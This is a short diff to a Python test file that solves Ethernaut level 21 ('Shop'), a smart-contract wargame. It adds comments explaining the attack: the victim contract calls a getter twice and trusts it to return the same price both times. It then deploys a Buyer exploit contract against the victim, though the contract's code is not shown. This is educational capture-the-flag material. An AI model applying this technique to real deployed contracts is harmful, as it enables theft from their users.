@@ -11,5 +11,8 @@ def test_lv21():
     ethernaut.check_lv21(contract)
 
 def exploit_lv21(contract: Shop):
+    # Attack vector: function price is called twice instead of saving its value
+    # Training: wrongly assuming that calling method (getter) returns the same value every time
+
     exploitContract = Buyer.deploy(victimAddress=contract.address)
     exploitContract.exploit()
